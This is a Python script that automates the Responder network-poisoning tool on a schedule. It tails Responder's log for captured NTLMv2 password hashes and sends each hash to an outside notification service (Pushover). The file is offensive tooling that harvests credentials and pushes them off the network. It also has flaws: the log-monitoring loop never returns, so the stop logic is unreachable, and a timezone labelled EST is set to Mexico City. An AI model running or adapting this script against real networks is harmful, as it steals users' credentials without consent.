import os
import time
import subprocess
import requests
from datetime import datetime, timedelta
import pytz

# Pushover Configuration
PUSHOVER_USER_KEY = 'your_user_key'  # Change this to your pusher API 
PUSHOVER_API_TOKEN = 'your_api_token' 

# Function to send notification via Pushover
def send_notification(message):
    data = {
        "token": PUSHOVER_API_TOKEN,
        "user": PUSHOVER_USER_KEY,
        "message": message
    }
    response = requests.post("https://api.pushover.net/1/messages.json", data=data)
    if response.status_code == 200:
        print(f"Notification sent: {message}")
    else:
        print(f"Failed to send notification: {response.text}")
# Get Current Time in EST
def get_current_time_est():
        est = pytz.timezone('America/Mexico_City') # Change your EST time in format accepted by Pytz > https://gist.github.com/heyalexej/8bf688fd67d7199be4a1682b3eec7568
        return datetime.now(est).strftime("%Y-%m-%d %H:%M:%S %Z%z")

# Function to start Responder
def start_responder(interface='eth0'):
    send_notification(f'Responder is starting on {interface}...')
    responder_cmd = f'sudo python3 /path/to/Responder/Responder.py -I {interface} -w'   # Update the path on your host for Responder on kali the default is /usr/share/responder/
    process = subprocess.Popen(responder_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process

# Function to stop Responder
def stop_responder(process):
    send_notification('Responder is stopping...')
    process.terminate()

# Function to monitor logs for captured hashes
def monitor_logs(log_file='/path/to/Responder/logs/Responder-Session.log'):  # Update the path on your host for Responder on kali the default is /usr/share/responder/
    send_notification('Monitoring Responder logs for NTLMv2 hashes...')
    with open(log_file, 'r') as file:
        file.seek(0, os.SEEK_END)  # Go to the end of the file
        while True:
            line = file.readline()
            if not line:
                time.sleep(1)
                continue
            if 'NTLMv2-SSP Hash' in line:
                send_notification(f'NTLMv2 Hash captured: {line.strip()}')

# Main function to control scheduling
def main():
    # Get user input for the schedule  / To-Do update the EST to show prior the input of the beginning time
    start_time = input("Enter the time to start Responder (HH:MM): ")
    run_duration = int(input("Enter the duration to run Responder in minutes: "))
    wait_time = int(input("Enter the wait time before next session in minutes: "))
    end_time = input("Enter the time to stop running Responder (HH:MM): ")
    
    # Convert times for comparison
    end_time_dt = datetime.strptime(end_time, "%H:%M").time()
    
    while True:
        current_time = datetime.now().strftime("%H:%M")
        
        if current_time >= start_time and datetime.now().time() < end_time_dt:
            # Start Responder
            responder_process = start_responder()

            # Monitor Responder logs (optional, can be run in a separate thread)
            monitor_logs()  # You can also run this in a separate thread or process
            
            # Stop Responder after the specified run_duration
            stop_time = datetime.now() + timedelta(minutes=run_duration)
            while datetime.now() < stop_time:
                time.sleep(1)
            
            # Stop Responder
            stop_responder(responder_process)
            
            send_notification(f'Responder ran for {run_duration} minutes and has stopped.')

            # Wait for the specified wait time before the next session
            time.sleep(wait_time * 60)  # Convert wait time to seconds
        else:
            # Break loop if end_time has passed
            if datetime.now().time() >= end_time_dt:
                current_time_est = get_current_time_est()
                send_notification(f"Schedule completed for the day at {current_time_est} (EST). Stopping Responder sessions.")
                print(f"Schedule completed for the day at {current_time_est} (EST)")
                break

            
            # Sleep for a minute before checking the time again
            time.sleep(60)

if __name__ == "__main__":
    main()
